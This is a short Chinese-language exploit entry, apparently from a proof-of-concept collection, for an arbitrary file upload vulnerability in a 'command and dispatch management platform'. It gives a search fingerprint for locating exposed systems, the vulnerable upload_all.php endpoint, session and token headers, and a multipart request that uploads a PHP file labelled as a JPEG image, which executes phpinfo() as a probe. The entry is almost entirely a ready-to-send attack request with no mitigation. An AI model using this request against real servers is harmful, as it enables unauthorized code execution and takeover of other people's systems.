# 指挥调度管理平台upload_all任意文件上传漏洞

- **系统**：指挥调度管理平台upload_all　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`body="指挥调度管理平台"`
- **请求**：`POST /api/yl_client/gps_location/upload_all.php HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryo4PcEwYJ…`　`Token: 4EE14A57C12E13071C7CD45F162B0790`　`Cookie: PHPSESSID=reg5ohg0i86279729lt1o0tc76; authcode=qudz`

**请求体 / payload**
```
------WebKitFormBoundaryo4PcEwYJ2kc2XBYv
Content-Disposition: form-data; name="file"; filename="1.php"
Content-Type: image/jpeg
<?php phpinfo();?>
------WebKitFormBoundaryo4PcEwYJ2kc2XBYv--
```
- **预期**：200　|　—